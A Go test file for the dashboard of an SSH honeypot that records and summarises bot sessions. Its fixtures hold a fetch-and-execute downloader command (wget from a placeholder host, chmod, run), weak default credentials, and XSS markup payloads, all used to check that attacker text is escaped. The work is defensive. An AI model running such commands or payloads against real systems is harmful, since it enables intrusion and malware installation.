package analysis

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/amirradjou/llm-honeypot/internal/recorder"
)

func seedDashboardData(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	at := time.Date(2026, 9, 24, 3, 0, 0, 0, time.UTC)
	r := recorder.New(dir)
	for i, payload := range []string{"x86", "arm7"} {
		s := r.Begin("conn-"+payload, "198.51.100."+string(rune('1'+i))+":40000", at.Add(time.Duration(i)*time.Hour))
		s.Auth("password", "root", "123456", "", "", true)
		s.Command("cd /tmp; wget http://198.51.100.9/"+payload+"; chmod +x "+payload+"; ./"+payload, "/root", "root", 0)
		s.Download("wget", "http://198.51.100.9/"+payload, "GET", "/tmp/"+payload)
		s.End(nil, at.Add(time.Duration(i)*time.Hour+40*time.Second))
	}
	// A probe on the following day, so the per-day chart has two rows.
	s := r.Begin("conn-probe", "198.51.100.7:1", at.Add(26*time.Hour))
	s.Auth("password", "admin", "admin", "", "", true)
	s.Command("uname -a", "/", "admin", 0)
	s.End(nil, at.Add(26*time.Hour+2*time.Second))
	return dir
}

func get(t *testing.T, h http.Handler, path string) *httptest.ResponseRecorder {
	t.Helper()
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, path, nil))
	return rec
}

func TestDashboardRendersTheOverview(t *testing.T) {
	d := NewDashboard(seedDashboardData(t), time.Millisecond)
	rec := get(t, d, "/")

	if rec.Code != http.StatusOK {
		t.Fatalf("status %d", rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/html") {
		t.Errorf("content type = %q", ct)
	}
	body := rec.Body.String()
	for _, want := range []string{
		"What the bots did",
		"Sessions",
		"cd → wget → chmod → ./payload", // clustering reached the page
		"root:123456",
		"198.51.100.9",
		"2026-09-24", // per-day chart
		"Recent sessions",
		"Did they suspect anything?",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("dashboard missing %q", want)
		}
	}
	// The page must be self-contained: no external scripts or styles, so it
	// works on an isolated host and cannot leak the page to a third party.
	for _, forbidden := range []string{"<script", "http://cdn", "https://cdn", "src=\"http"} {
		if strings.Contains(body, forbidden) {
			t.Errorf("page should be self-contained, found %q", forbidden)
		}
	}
	if csp := rec.Header().Get("Content-Security-Policy"); !strings.Contains(csp, "default-src 'none'") {
		t.Errorf("CSP = %q", csp)
	}
}

func TestDashboardEscapesAttackerText(t *testing.T) {
	// A bot whose password and command contain markup must not be able to
	// inject anything into the operator's dashboard.
	dir := t.TempDir()
	at := time.Date(2026, 9, 24, 3, 0, 0, 0, time.UTC)
	r := recorder.New(dir)
	s := r.Begin("xss", "198.51.100.1:1", at)
	s.Auth("password", "root", `<script>alert(1)</script>`, "", "", true)
	s.Command(`echo "<img src=x onerror=alert(2)>"`, "/root", "root", 0)
	s.End(nil, at.Add(time.Second))

	rec := get(t, NewDashboard(dir, time.Millisecond), "/")
	body := rec.Body.String()
	if strings.Contains(body, "<script>alert(1)</script>") {
		t.Error("password markup was not escaped")
	}
	if strings.Contains(body, "<img src=x onerror") {
		t.Error("command markup was not escaped")
	}
	// It should still be visible, just inert.
	if !strings.Contains(body, "&lt;script&gt;") && !strings.Contains(body, "&lt;img") {
		t.Errorf("attacker text should appear escaped, not vanish:\n%s", body[:min(len(body), 400)])
	}
}

func TestDashboardMarkdownAndHealth(t *testing.T) {
	d := NewDashboard(seedDashboardData(t), time.Millisecond)

	rec := get(t, d, "/report.md")
	if rec.Code != http.StatusOK {
		t.Fatalf("report.md status %d", rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/markdown") {
		t.Errorf("content type = %q", ct)
	}
	if !strings.Contains(rec.Body.String(), "# What the bots did") {
		t.Error("markdown report not served")
	}

	if rec := get(t, d, "/healthz"); rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), "ok") {
		t.Errorf("healthz = %d %q", rec.Code, rec.Body.String())
	}
	if rec := get(t, d, "/nope"); rec.Code != http.StatusNotFound {
		t.Errorf("unknown path = %d", rec.Code)
	}
}

func TestDashboardEmptyDataDir(t *testing.T) {
	rec := get(t, NewDashboard(t.TempDir(), time.Millisecond), "/")
	if rec.Code != http.StatusOK {
		t.Fatalf("status %d", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "No sessions recorded yet") {
		t.Error("empty state missing")
	}
}

func TestDashboardCachesReads(t *testing.T) {
	dir := seedDashboardData(t)
	d := NewDashboard(dir, time.Hour) // long TTL: the second read must be cached
	clock := time.Date(2026, 9, 25, 0, 0, 0, 0, time.UTC)
	d.now = func() time.Time { return clock }

	first, err := d.sessions()
	if err != nil {
		t.Fatal(err)
	}
	// Add a recording after the first read; with the TTL unexpired the
	// dashboard must not see it yet.
	r := recorder.New(dir)
	s := r.Begin("late", "198.51.100.9:1", clock)
	s.Command("id", "/root", "root", 0)
	s.End(nil, clock.Add(time.Second))

	second, _ := d.sessions()
	if len(second) != len(first) {
		t.Errorf("expected cached result (%d), got %d", len(first), len(second))
	}
	// Past the TTL it reloads.
	clock = clock.Add(2 * time.Hour)
	third, _ := d.sessions()
	if len(third) != len(first)+1 {
		t.Errorf("expected reload to pick up the new session: %d -> %d", len(first), len(third))
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func TestDashboardRefreshIsRealAndBounded(t *testing.T) {
	// The header claims the page reloads; that claim must be backed by an
	// actual meta refresh, since the CSP rules out JavaScript.
	d := NewDashboard(seedDashboardData(t), 30*time.Second)
	body := get(t, d, "/").Body.String()
	if !strings.Contains(body, `http-equiv="refresh" content="30"`) {
		t.Errorf("no meta refresh in the page:\n%s", body[:min(len(body), 600)])
	}
	if !strings.Contains(body, "reloads every 30s") {
		t.Error("header should state the real interval")
	}
	// A tiny TTL must not turn into a refresh loop.
	if got := NewDashboard("x", time.Millisecond).refreshSeconds(); got != 5 {
		t.Errorf("refresh floor = %d, want 5", got)
	}
	if got := NewDashboard("x", time.Hour).refreshSeconds(); got != 300 {
		t.Errorf("refresh ceiling = %d, want 300", got)
	}
}
